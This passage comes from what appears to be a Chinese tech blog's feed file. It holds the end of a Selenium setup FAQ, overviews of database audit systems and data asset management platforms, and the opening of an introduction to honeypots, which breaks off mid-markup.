title="二、常见问题"></a>二、常见问题</h2><p>在安装Selenium的过程中，可能会遇到一些常见的问题</p><h3 id="1-Selenium版本与浏览器驱动程序不兼容："><a href="#1-Selenium版本与浏览器驱动程序不兼容：" class="headerlink" title="1. Selenium版本与浏览器驱动程序不兼容："></a>1. Selenium版本与浏览器驱动程序不兼容：</h3><ul><li>问题：安装的Selenium版本与浏览器驱动程序版本不兼容。</li><li>解决方案：检查Selenium和浏览器驱动程序的版本，确保它们相互兼容。通常，Selenium的最新版本会支持最新的浏览器驱动程序。如果需要，可以降级或升级Selenium或浏览器驱动程序以确保兼容性。<h3 id="2-浏览器驱动程序路径未正确设置："><a href="#2-浏览器驱动程序路径未正确设置：" class="headerlink" title="2. 浏览器驱动程序路径未正确设置："></a>2. 浏览器驱动程序路径未正确设置：</h3></li><li>问题：浏览器驱动程序的路径未正确设置，导致Selenium无法找到驱动程序。</li><li>解决方案：确保将浏览器驱动程序的路径添加到系统环境变量中，或者在Selenium代码中明确指定驱动程序的路径。例如，对于ChromeDriver，可以在代码中这样设置：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </span><br><span class="line">driver = webdriver.Chrome(executable_path=<span class="string">'/path/to/chromedriver'</span>)</span><br></pre></td></tr></table></figure><p>后续我们将实战通过selenium来实现登录到淘宝并获取淘宝的商品信息。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据安全之认识数据库审计系统</title>
      <link href="/posts/3264b908/"/>
      <url>/posts/3264b908/</url>
      
        <content type="html"><![CDATA[<p>随着企业业务数据量的不断增长和数据存储的集中化，数据库成为企业的核心资产之一。然而，数据库面临着各种安全威胁，如SQL注入、权限滥用、数据泄露等。为了保障数据库的安全性和完整性，企业需要采取有效的审计措施来监控和记录数据库的操作行为。本文让我们一起来认识数据库审计系统。</p><h2 id="一、什么是数据库审计系统"><a href="#一、什么是数据库审计系统" class="headerlink" title="一、什么是数据库审计系统"></a>一、什么是数据库审计系统</h2><p>数据库审计系统是通过对所有访问数据库操作行为的审计，详细记录用户对数据库进行增删改查、查询、登录等操作行为及返回结果，通过配置安全规则实现对危险操作的实时告警和事后追溯，从而达到保护数据库安全的防护效果的审计产品。通常黑客的SQL注入攻击行为，也可以通过数据库审计发现。</p><p>数据库审计系统具备实时监测并智能地分析、还原各种数据库操作过程的功能。它还能根据设置的规则，智能地判断出违规操作数据库的行为，并对违规行为进行记录、报警，甚至阻断攻击行为。</p><p>数据库审计系统的主要价值在于：</p><ol><li>在发生数据库安全事件（例如数据篡改、泄露）后，为事件的追责定责提供依据。</li><li>针对数据库操作的风险行为进行时时告警，帮助管理人员对用户的行为一目了然，真正做到数据库操作行为可监控，违规操作可追溯。</li></ol><p>此外，数据库审计系统还可以帮助用户事后生成合规报告，提高数据资产安全。它是数据库安全技术之一，与数据库漏扫、数据库加密、数据库防火墙、数据脱敏等技术共同构成了数据库安全体系。</p><h2 id="二、为什么需要数据库审计系统"><a href="#二、为什么需要数据库审计系统" class="headerlink" title="二、为什么需要数据库审计系统"></a>二、为什么需要数据库审计系统</h2><p>数据库审计系统产生的背景主要基于以下几个方面的需求和发展趋势：</p><ol><li>数据安全风险增加：随着企业业务数据量的不断增长和数据存储的集中化，数据库成为企业的核心资产之一。然而，数据库面临着各种安全威胁，如SQL注入、权限滥用、数据泄露等。为了保障数据库的安全性和完整性，企业需要采取有效的审计措施来监控和记录数据库的操作行为。</li><li>法规政策要求：随着数据保护法规的日益严格，如GDPR（通用数据保护条例）等，企业需要确保数据库操作符合法规要求，并能够提供合规的审计日志。数据库审计系统能够帮助企业满足这些法规要求，提供合规的审计证据。</li><li>业务需求推动：企业为了保障业务连续性和数据安全，需要对数据库操作进行严格的控制和审计。例如，企业需要监控敏感数据的访问和操作，确保只有授权的用户能够执行特定的操作。数据库审计系统能够提供细粒度的审计和监控功能，满足企业的业务需求。</li><li>技术发展推动：随着数据库技术的不断发展和创新，如云计算、大数据等技术的广泛应用，数据库审计系统也需要不断升级和完善，以适应新的技术环境和安全挑战。<br>基于数据安全风险增加、法规政策要求、业务需求推动和技术发展推动等因素。企业需要采用有效的数据库审计系统来监控和记录数据库操作行为，保障数据的安全性和合规性，同时满足业务需求和技术发展要求。</li></ol><h2 id="三、数据库审计系统的主要功能"><a href="#三、数据库审计系统的主要功能" class="headerlink" title="三、数据库审计系统的主要功能"></a>三、数据库审计系统的主要功能</h2><p>数据库审计的主要功能在于对数据库的访问行为进行监管，通过镜像或探针的方式采集所有数据库的访问流量，记录下数据库的所有访问和操作行为，在发生数据库安全事件（例如数据篡改或泄露）后为事件的追责提供依据，并针对数据库操作的风险行为进行告警。<br><strong>1、实时监控与访问审计</strong><br>数据库审计系统可实时监控防护数据库系统，防止运维人员、黑客、内部人员的危险操作。当用户访问数据库时，数据库审计系统能够根据内置或者自定义的风险告警规则，进行行为特征及审计规则匹配，任何对数据库的攻击或触发审计规则的操作都会被审计系统记录并实时告警。<br><strong>2、审计记录检索</strong><br>数据库审计系统通过各种条件组合的方式进行查询，能够快速精确地定位到某条审计记录。这些组合条件包括操作语句、MAC地址、客户端IP、数据库信息、时间、返回结果等内容。<br><strong>3、丰富的安全审计报表</strong><br>数据库审计系统具备功能强大的报表功能，根据审计检索的条件可以导出合规报表和自定义安全报表。<br><strong>4、安全事件回放</strong><br>允许安全管理员提取历史数据，对过去某一时段的事件进行回放，真实展现当时的完整数据库操作过程，便于分析和追溯系统安全问题。<br><strong>5、风险触发实时告警</strong><br>一旦出现违反数据库安全审计规则的操作，数据库审计系统通常可以配置多种告警方式，包括通过手机短信、邮件、SYSLOG、SNMP等发送到对应运维或者管理人员手中。</p><h2 id="四、数据库审计系统的原理"><a href="#四、数据库审计系统的原理" class="headerlink" title="四、数据库审计系统的原理"></a>四、数据库审计系统的原理</h2><p>数据库审计系统的原理主要是基于数据库协议标准分析和SQL解析技术，通过旁路部署的方式，镜像或探针采集所有数据库的访问流量，然后对这些流量进行深度解析和审计。<br>具体来说，数据库审计系统通过获取访问数据库的报文，对报文进行深度解析，提取出针对数据库的操作信息，如访问数据库的IP、账号、时间、操作类型、操作对象以及返回结果等。然后，系统根据预设的审计策略，对这些操作信息进行风险识别，判断是否存在违规操作或安全威胁。如果存在违规行为，系统会实时发出告警，并记录相关审计日志，以便后续分析和追溯。<br>此外，数据库审计系统还可以根据需要对审计记录进行检索和分析，提供丰富的查询条件和统计分析功能，帮助管理员快速定位问题和追根溯源。同时，系统还可以生成合规报告，帮助用户满足相关的法规要求。<br>综上所述，数据库审计系统的原理主要是通过采集、解析和审计数据库访问流量，识别违规操作和安全威胁，提供实时告警和审计记录查询功能，确保数据库的安全性和合规性。</p><h2 id="五、数据库审计系统的部署方式"><a href="#五、数据库审计系统的部署方式" class="headerlink" title="五、数据库审计系统的部署方式"></a>五、数据库审计系统的部署方式</h2><p><strong>1、常规部署（硬件形式旁路部署）</strong><br>数据库审计系统采用旁路部署时，硬件设备与交换机直连，通过交换机把数据库的访问流量镜像到某个端口，流量直接发送到数据库审计系统的网卡驱动，审计系统需要对流量进行捕获并解析处理。<br><strong>2、软件部署（软件形式虚拟化部署）</strong><br>通过插件引流的模式在目标数据库安装agent，解决云环境、虚拟化环境内部流量无法镜像的问题，这种场景下数据库审计系统依旧可以获取网卡的流量，保证正常审计。<br><strong>3、分布式部署</strong><br>分布式部署分为中心节点和子节点，审计中心统一负责数据库审计日志数据的存储和分析，审计子节点作为探针负责数据库操作日志的采集、解析和审计，一个审计中心可管理多个审计子节点。另一种模式是单独一个审计管理平台，其他子节点都是正常的审计设备，一个平台实现运维管理和运行监控，适用大型企业单位的分布式部署场景。</p><h2 id="六、数据库审计系统如何确保数据安全性"><a href="#六、数据库审计系统如何确保数据安全性" class="headerlink" title="六、数据库审计系统如何确保数据安全性"></a>六、数据库审计系统如何确保数据安全性</h2><ol><li>实时监控与审计：数据库审计系统能够实时监控数据库的所有操作行为，包括访问、修改、删除等。这种实时监控可以确保对数据库的所有活动都有详细的记录，从而能够及时发现并应对任何潜在的安全威胁。</li><li>违规操作检测与告警：系统能够智能地分析并识别出违规操作，如非法越权访问、数据篡改等，并实时发出告警。这有助于管理员及时采取应对措施，防止数据泄露或损坏。</li><li>审计策略管理：系统支持灵活的审计策略设定，可以根据需要对登录用户、数据库表名、字段名及关键字等内容进行多种条件组合的规则设定。这种策略管理可以帮助管理员精确地控制哪些操作需要被审计，从而提高审计效率。</li><li>审计记录检索与分析：系统提供丰富的审计查询条件和细致的统计分析条件，支持以地址、性能消耗、语句数量等多种条件在海量数据中快速检索审计记录。这有助于管理员快速定位问题，找出潜在的安全风险。</li><li>合规报告与事故追根溯源：通过对用户访问数据库行为的记录、分析和汇报，系统可以帮助用户生成合规报告，以及在发生数据安全事故时进行追根溯源，明确责任。这有助于组织满足合规性要求，同时也有助于防止类似事件再次发生。</li><li>风险预警与日志管理：系统提供24小时实时监控，支持syslog、snmp、邮件、网管联动、短信猫、录像等多种方式对危险行为实时告警。此外，系统还具备强大的日志查询与报表管理功能，保证查询结果的可视化展示。这些功能可以帮助管理员及时发现并应对潜在的安全风险。</li></ol><p>数据库审计系统通过实时监控、违规操作检测、审计策略管理、审计记录检索、合规报告与事故追根溯源以及风险预警与日志管理等方式，确保数据库的安全性。这些功能共同构成了一个全面的数据库安全防护体系，帮助组织有效地保护其数据免受未经授权的访问和数据泄露的威胁。</p><h2 id="七、数据库审计和日志审计系统的区别和联系"><a href="#七、数据库审计和日志审计系统的区别和联系" class="headerlink" title="七、数据库审计和日志审计系统的区别和联系"></a>七、数据库审计和日志审计系统的区别和联系</h2><p>数据库审计和日志审计系统都是企业IT安全领域中的重要组成部分，但它们之间存在一些区别和联系。</p><ul><li><strong>区别：</strong></li></ul><ol><li>审计对象不同：数据库审计系统主要关注数据库层面的安全审计，监控和记录对数据库的操作行为，包括数据的访问、修改、删除等。而日志审计系统则更广泛地关注企业IT系统中的各种设备、应用和系统产生的日志，包括安全设备、网络设备、服务器、应用系统等。</li><li>审计重点不同：数据库审计系统侧重于对数据库操作行为的合规性、风险性进行审计，帮助用户事后生成合规报告、事故追根溯源。而日志审计系统则更注重对整个IT系统的活动进行审计，包括系统的运行状态、安全事件、用户行为等。</li><li>审计范围不同：数据库审计系统主要关注数据库系统的安全，包括数据库对象的创建、修改和删除，用户的登录和退出，数据库的访问等。而日志审计系统则通常关注整个系统的活动，包括操作系统、应用程序等的活动，以及网络流量等。</li></ol><ul><li><strong>联系：</strong></li></ul><ol><li>相辅相成：数据库审计系统和日志审计系统在企业IT安全中都扮演着重要的角色，它们相辅相成，共同构成了企业IT安全审计的完整体系。数据库审计系统可以为日志审计系统提供更为细粒度的审计数据，而日志审计系统则可以为数据库审计系统提供更为全面的系统活动信息。</li><li>相互支持：在实际应用中，数据库审计系统和日志审计系统可以相互支持和配合，共同提高企业的IT安全水平。例如，当数据库审计系统检测到异常操作时，可以触发日志审计系统对相关日志进行深入分析，以便及时发现和应对安全事件。</li></ol><p>数据库审计和日志审计系统在审计对象、审计重点和审计范围等方面存在明显的区别，但它们在企业IT安全中又相互支持、相辅相成，共同构成了企业IT安全审计的完整体系。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据安全之认识数据资产管理平台</title>
      <link href="/posts/f1b4c47/"/>
      <url>/posts/f1b4c47/</url>
      
        <content type="html"><![CDATA[<p>随着企业数字化转型的深入，数据已经成为企业的重要资产。企业需要更加有效地管理和利用数据，以支持业务决策、优化运营和提高竞争力。本文让我们一起来认识数据资产及数据资产管理平台。</p><h2 id="一、什么是数据资产"><a href="#一、什么是数据资产" class="headerlink" title="一、什么是数据资产"></a>一、什么是数据资产</h2><p>数据资产是指由个人或企业拥有或控制的，能够为企业带来未来经济利益的，以物理或电子的方式记录的数据资源。这些数据资源需要满足以下条件才能被称为数据资产：</p><ol><li>有价值性：数据资产必须具有价值，能够为企业带来经济利益。这种价值可以表现为直接的经济效益，如提高销售额、降低成本等，也可以表现为间接的经济效益，如提升客户满意度、优化业务流程等。</li><li>可计量性：数据资产的价值必须能够进行量化和计量。这意味着数据资产需要具有可衡量和可评估的属性，可以通过数据分析和挖掘来评估其潜在价值和贡献。</li><li>可读取性：数据资产必须以物理或电子的方式记录，能够被读取、存储和处理。这意味着数据资产需要具有标准化的格式和规范，能够被各种系统和工具所识别和利用。</li><li>权属明确：数据资产必须具有明确的权属关系，即数据的所有权、使用权等需要清晰明确，能够被合法地拥有和控制。这有助于保护企业的数据权益，防止数据泄露和滥用。</li></ol><p><strong>数据资产与普通数据的主要区别在于它们的性质和价值</strong>。数据资产被视为一种有价值的资源，需要得到妥善的管理和保护，以实现其潜在的经济价值。只有满足以上条件的数据资源才能被称为数据资产。数据资产是企业重要的无形资产之一，对于企业的决策制定、业务优化和经济发展具有重要意义。因此，企业需要加强数据资产的管理和保护，提高数据的质量和价值，从而实现数据驱动的业务发展。</p><h2 id="二、什么是数据资产管理平台"><a href="#二、什么是数据资产管理平台" class="headerlink" title="二、什么是数据资产管理平台"></a>二、什么是数据资产管理平台</h2><h3 id="1、什么是数据资产管理平台"><a href="#1、什么是数据资产管理平台" class="headerlink" title="1、什么是数据资产管理平台"></a>1、什么是数据资产管理平台</h3><p>数据资产管理平台是一个用于集中管理、保护和利用组织数据资产的工具。它提供了一个统一的方式来存储、访问、分析和共享数据，旨在帮助组织更好地管理和利用其数据资产。该平台通常包括数据资产盘点、元数据管理、智能数据分析、数据标准管理、数据集成管理、数据质量管理等功能模块，可以实现对数据资产的全面管理和控制。<br>数据资产管理平台的核心能力包括简洁可视化的目录构建流程、数据资产标签、数据资产服务等，可以帮助组织实现数据资产的规范管理和高效利用。同时，该平台还具备数据安全保障能力，可以确保数据的安全性和完整性，防止数据泄露和非法访问。</p><h3 id="2、为什么需要数据资产管理平台"><a href="#2、为什么需要数据资产管理平台" class="headerlink" title="2、为什么需要数据资产管理平台"></a>2、为什么需要数据资产管理平台</h3><p>● <strong>数字化转型趋势</strong>：随着企业数字化转型的深入，数据已经成为企业的重要资产。企业需要更加有效地管理和利用数据，以支持业务决策、优化运营和提高竞争力。数据资产管理平台应运而生，为企业提供数据整合、分析、挖掘和利用的能力。<br>● <strong>数据复杂性增加</strong>：随着企业数据规模的不断扩大和来源的多样化，数据的复杂性也在增加。企业需要解决数据整合、数据质量、数据安全等问题，以确保数据的准确性和可靠性。数据资产管理平台通过提供数据集成、数据清洗、数据治理等功能，帮助企业解决这些问题。<br>● <strong>数据价值挖掘需求</strong>：数据资产中蕴含着巨大的价值，但如何发现并利用这些价值成为企业的挑战。数据资产管理平台通过数据分析和挖掘技术，帮助企业发现数据中的模式、趋势和洞察，从而挖掘数据的潜在价值。<br>● <strong>法规政策要求</strong>：随着数据保护法规的日益严格，企业需要确保数据的安全性和合规性。数据资产管理平台通过提供数据加密、访问控制、审计日志等功能，帮助企业满足法规政策的要求，保护数据的安全和隐私。</p><p>数据资产管理平台对于现代企业来说具有重要的意义。随着大数据时代的到来，数据已经成为企业的重要资产，而如何有效地管理和利用这些数据资产已经成为企业面临的重要挑战。数据资产管理平台可以帮助企业实现数据资产的规范化、标准化和高效化管理，提高数据的质量和价值，从而为企业的发展提供有力的支持。</p><h2 id="三、数据资产管理平台的主要功能"><a href="#三、数据资产管理平台的主要功能" class="headerlink" title="三、数据资产管理平台的主要功能"></a>三、数据资产管理平台的主要功能</h2><p>数据资产管理平台的主要功能包括：</p><ol><li>数据资产盘点：从组织架构、业务、信息系统等不同维度统计数据资产，实现组织级数据资产的电子化管理和动态维护功能，形成数据资产管理账册，是实施数据资产管理的重要步骤。</li><li>元数据管理：主要包括数据源管理、数据对象管理、数据资产构造细节、数据标准版本管理等功能。通过元数据标准化、自动审核、血缘关系分析、影响分析等功能，使元数据管理更加自动化、系统化、规范化。</li><li>智能数据分析：基于统计学、模式识别、机器学习、数据抽象等数据分析工具从数据中发现知识的分析方法，直接或间接提高工作效率，帮助用户在正确的时间拥有正确的数据信息，快速做出正确的决策。</li><li>数据标准管理：数据标准分为基本标准和指标标准。通过数据标准，可以检查落地情况和数据质量问题。</li><li>数据集成管理：基于WEB页面的批量集成、可视化流程设计、任务集群管理的数据集成功能，提供全量、增量、CDC、数据库表复制等不同的数据集成能力。</li><li>数据质量管理：数据安全管理规范文件的集中管理、存储和访问，自动发现和分类敏感数据和权限，发现合规风险，监控敏感数据，监控不当数据询问，了解谁在访问数据，观察异常情况并防止数据丢失。</li><li>数据安全和权限管理：确保数据的安全性和隐私保护，包括数据加密、访问控制、权限管理等。</li><li>数据共享和协作：支持数据的共享和协作，促进不同部门和团队之间的数据共享和交流。<br>数据资产管理平台的主要功能涵盖了数据资产盘点、元数据管理、智能数据分析、数据标准管理、数据集成管理、数据质量管理、数据安全和权限管理以及数据共享和协作等方面，旨在帮助企业全面管理和利用自身的数据资产，提高数据的质量和价值，为企业的发展提供有力的支持。</li></ol><h2 id="四、数据资产管理平台的工作原理"><a href="#四、数据资产管理平台的工作原理" class="headerlink" title="四、数据资产管理平台的工作原理"></a>四、数据资产管理平台的工作原理</h2><p>数据资产管理平台通过资产发现系统对多类型数据的资产数据做识别、分析并采集到资源库。支持数据表技术字段、业务类型、字段业务类型识别，以标准数据格式存储，通过后端服务实现对目录和资源的数据管理。</p><p>技术架构示意图如下：</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240218/%E6%95%B0%E6%8D%AE%E8%B5%84%E4%BA%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84.png" alt="数据资产管理平台技术架构"></p><ol><li>数据收集与整合：平台首先通过各种方式（如数据库接口、文件导入、API等）从企业的各个数据源中收集数据，并对这些数据进行整合和清洗，以确保数据的准确性和一致性。</li><li>元数据提取与管理：平台会自动提取数据的元数据（即描述数据的数据），并对这些元数据进行管理。元数据可以帮助企业理解数据的来源、含义、关系以及使用方式。</li><li>数据资产目录构建：基于元数据，平台会构建一个数据资产目录。这个目录可以清晰地展示企业的所有数据资产，包括它们的类型、位置、状态以及与其他数据资产的关系。</li><li>数据质量监控与提升：平台会对数据的质量进行持续的监控，并提供工具和方法来提升数据质量。例如，平台可以检测数据的完整性、准确性、一致性等，并提供数据清洗和转换的工具。</li><li>数据安全保护：平台会实施严格的数据安全保护措施，包括数据加密、访问控制、审计日志等，以确保数据的安全性和隐私性。</li><li>数据展示与服务提供：平台会提供一系列的数据服务，如数据查询、数据分析、数据挖掘等，以帮助用户更好地利用数据。同时，平台也会支持数据的共享和交换，以促进企业内部以及企业与外部的数据合作。</li></ol><p>数据资产管理平台通过自动化的方式，对企业的数据资产进行全面的管理、保护和利用，从而帮助企业提高数据的质量和价值，实现数据驱动的业务发展。</p><h2 id="五、数据资产管理平台的应用场景"><a href="#五、数据资产管理平台的应用场景" class="headerlink" title="五、数据资产管理平台的应用场景"></a>五、数据资产管理平台的应用场景</h2><p>数据资产管理平台的应用场景非常广泛，主要涵盖以下几个领域：</p><ol><li>企业数据管理：数据资产管理平台可以帮助企业管理和整合各类数据，包括客户数据、产品数据、供应链数据、财务数据等。通过实现数据的一致性和准确性，平台支持企业的决策和业务运营。</li><li>数据分析与洞察：通过数据资产管理平台，企业可以进行数据分析和挖掘，发现数据中的模式、趋势和洞察。这些洞察有助于企业了解市场需求、优化产品设计、改进营销策略等。</li><li>智能决策支持：平台可以提供实时和准确的数据，支持企业进行智能决策。通过数据的可视化和报表生成，企业可以快速获取关键指标和业务洞察，以支持决策制定和执行。</li><li>客户关系管理：数据资产管理平台可以集成和管理客户数据，帮助企业建立完整的客户画像，实现个性化营销、客户维护和客户服务的优化。</li><li>供应链管理：平台可以监控和管理供应链中的各个环节，包括供应商管理、库存管理、物流管理等，从而提高供应链的效率和可靠性。</li><li>金融风控：在金融行业，数据资产管理平台可以集成和分析大量的金融数据，帮助金融机构进行风险评估和风控管理，提高风险管理的准确性和效率。</li></ol><p>此外，随着技术的发展和应用场景的不断扩展，数据资产管理平台还可能应用于更多的领域，如物联网、人工智能、大数据等，以满足企业不断增长的数据管理和利用需求。</p><h2 id="六、安全资产管理平台与数据资产管理平台的区别与关系"><a href="#六、安全资产管理平台与数据资产管理平台的区别与关系" class="headerlink" title="六、安全资产管理平台与数据资产管理平台的区别与关系"></a>六、安全资产管理平台与数据资产管理平台的区别与关系</h2><p>安全资产管理平台和数据资产管理平台在功能和目标上存在一定的区别，但它们之间也存在紧密的联系。</p><h3 id="1、安全资产管理平台与数据资产管理平台的区别"><a href="#1、安全资产管理平台与数据资产管理平台的区别" class="headerlink" title="1、安全资产管理平台与数据资产管理平台的区别"></a>1、安全资产管理平台与数据资产管理平台的区别</h3><ol><li>关注点不同：安全资产管理平台主要关注资产的安全性和风险管理，包括资产识别、风险评估、安全策略制定等。而数据资产管理平台则更侧重于数据的收集、整合、分析和利用，关注数据的完整性、准确性、一致性和可访问性等方面。</li><li>管理对象不同：安全资产管理平台主要管理的是企业的IT资产，包括硬件、软件、网络设备等。而数据资产管理平台则主要管理企业的数据资产，包括结构化数据、非结构化数据、流数据等。</li><li>技术手段不同：安全资产管理平台通常采用安全审计、漏洞扫描、入侵检测等技术手段来确保资产的安全。而数据资产管理平台则利用数据集成、数据清洗、数据挖掘等技术手段来管理和利用数据资产。<h3 id="2、安全资产管理平台与数据资产管理平台的关系"><a href="#2、安全资产管理平台与数据资产管理平台的关系" class="headerlink" title="2、安全资产管理平台与数据资产管理平台的关系"></a>2、安全资产管理平台与数据资产管理平台的关系</h3></li><li>相辅相成：安全资产管理平台和数据资产管理平台在企业的信息化建设中相辅相成。安全资产管理平台为数据资产管理平台提供了安全保障，确保数据资产在收集、传输、存储、使用等过程中的安全性。而数据资产管理平台则通过有效的数据管理和利用，为企业的业务决策和运营提供有力支持，同时也为安全资产管理平台提供了更多的数据源和分析依据。</li><li>相互促进：随着企业信息化程度的不断提高，数据资产的安全性和价值性日益凸显。安全资产管理平台和数据资产管理平台可以通过相互集成和协作，共同提升企业的信息化水平和核心竞争力。例如，通过数据资产管理平台发现的数据异常或风险，可以触发安全资产管理平台进行相应的安全审计和风险评估，从而及时发现和解决潜在的安全隐患。</li></ol><p>安全资产管理平台和数据资产管理平台虽然在功能和目标上存在一定的区别，但它们之间紧密相连、相互促进，共同构成了企业信息化建设的重要组成部分。</p><h2 id="七、企业如何利用数据资产管理平台管理数据"><a href="#七、企业如何利用数据资产管理平台管理数据" class="headerlink" title="七、企业如何利用数据资产管理平台管理数据"></a>七、企业如何利用数据资产管理平台管理数据</h2><p>数据资产管理平台可以通过以下几个方面帮助企业管理数据：</p><ol><li>数据资产盘点：数据资产管理平台可以对企业的数据资产进行全面的盘点，包括数据的来源、存储、使用情况等，从而帮助企业了解自身的数据资产状况，为数据管理和利用提供基础数据。</li><li>元数据管理：元数据是描述数据的数据，通过对元数据的管理，可以帮助企业更好地理解和利用数据。数据资产管理平台可以提供元数据的采集、存储、查询和利用等功能，从而实现元数据的规范化管理。</li><li>智能数据分析：数据资产管理平台可以利用人工智能技术对数据进行分析和挖掘，从而帮助企业发现数据中的规律和趋势，提高数据的利用价值。</li><li>数据标准管理：数据资产管理平台可以制定和管理企业的数据标准，包括数据格式、数据命名、数据分类等，从而确保数据的规范性和一致性，提高数据的质量和可利用性。</li><li>数据集成管理：数据资产管理平台可以实现对企业内部和外部的数据进行集成和整合，从而消除数据孤岛，实现数据的共享和利用。</li><li>数据质量管理：数据资产管理平台可以对数据进行质量检查和管理，包括数据的完整性、准确性、一致性等，从而确保数据的质量和可靠性。</li><li>数据安全保障：数据资产管理平台可以提供数据安全保障能力，包括数据的加密、备份、恢复等，从而确保数据的安全性和完整性，防止数据泄露和非法访问。</li></ol><p>数据资产管理平台可以通过全面的数据管理和利用能力，帮助企业更好地管理和利用自身的数据资产，提高数据的质量和价值，为企业的发展提供有力的支持。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全产品之认识蜜罐</title>
      <link href="/posts/30603dd9/"/>
      <url>/posts/30603dd9/</url>
      
        <content type="html"><![CDATA[<p>蜜罐的概念首次由Clifford Stoll在其1988年出版的小说《The Cuckoo’s Egg》中提出。Clifford Stoll不仅是一位著名的计算机安全专家，还是这本小说的作者。他在小说中描述了自己作为一个公司的网络管理员如何追踪并发现一起商业间谍案的故事。在这个过程中，他成功地利用包含虚假信息的文件作为诱饵来检测入侵，这种技术思想就是蜜罐的雏形。因此，可以认为Clifford Stoll是首次提出蜜罐概念的人。随后，在1998年，商用的蜜罐产品开始出现，这标志着蜜罐技术开始从理论走向实际应用。本文让我们一起来认识蜜罐。</p><h2 id="一、什么是蜜罐"><a href="#一、什么是蜜罐" class="headerlink" title="一、什么是蜜罐"></a>一、什么是蜜罐</h2><p>蜜罐（Honeypot）是一种主动防御技术，是一个包含漏洞的诱骗系统。蜜罐技术本质上是一种对攻击方进行欺骗的技术，通过布置一些作为诱饵的主机、网络服务或者信息，诱使攻击方对它们实施攻击，从而可以对攻击行为进行捕获和分析，了解攻击方所使用的工具与方法，推测攻击意图和动机，能够让防御方清晰地了解他们所面对的安全威胁，并通过技术和管理手段来增强实际系统的安全防护能力。<br>蜜罐好比是情报收集系统。蜜罐好像是故意让人攻击的目标，引诱黑客前来攻击。所以攻击者入侵后，你就可以知道他是如何得逞的，随时了解针对服务器发动的最新的攻击和漏洞。还可以通过窃听黑客之间的联系，收集黑客所用的种种工具，并且掌握他们的社交网络。</p><h2 id="二、蜜罐的主要类型"><a href="#二、蜜罐的主要类型" class="headerlink" title="二、蜜罐的主要类型"></a>二、蜜罐的主要类型</h2><p>蜜罐的主要类型可以根据其交互程度和实现方式进行分类：</p><ol><li>根据交互程度的不同，蜜罐可以分为<strong>高交互蜜罐</strong>和<strong>低交互蜜罐</strong>。<br>● 高交互蜜罐：提供一个真实的、可交互的操作系统或服务。这种蜜罐模拟了真实系统的功能，允许攻击者获得完全的访问权限，并能作为跳板实施进一步的网络攻击。然而，高交互蜜罐的部署较为困难，维护成本较高，且一旦服务上存在的漏洞被利用，容易引发新的安全问题。<br>● 低交互蜜罐：只模拟部分系统、端口或服务的功能。这种蜜罐的设计相对简单，主要目的是引诱攻击者进行交互，同时保护真实的系统不受攻击。由于低交互蜜罐的功能有限，攻击者不能通过攻击这些服务获得完全的访问权限。因此，低交互蜜罐相对容易部署和维护。</li><li>从实现方法上来分，蜜罐可分为<strong>物理蜜罐</strong>和<strong>虚拟蜜罐</strong>。<br>● 物理蜜罐：指网络上一台真实的完整计算机，它运行着真实的操作系统和服务，具有较高的逼真度，能够吸引更多的攻击者。然而，物理蜜罐的部署和维护成本较高，且可能面临法律和道德问题。<br>● 虚拟蜜罐：由一台计算机模拟的系统，它可以响应发送给虚拟蜜罐的网络流量。虚拟蜜罐具有成本低、易于部署和管理的优点，同时可以模拟多种操作系统和服务，提高蜜罐的灵活性和多样性。</li></ol><p>此外，根据部署目的的不同，蜜罐还可以分为产品型蜜罐和研究型蜜罐两类。产品型蜜罐主要用于为一个组织的网络提供安全保护，而研究型蜜罐则专门用于对黑客攻击的捕获和分析。</p><h2 id="三、蜜罐的主要功能"><a href="#三、蜜罐的主要功能" class="headerlink" 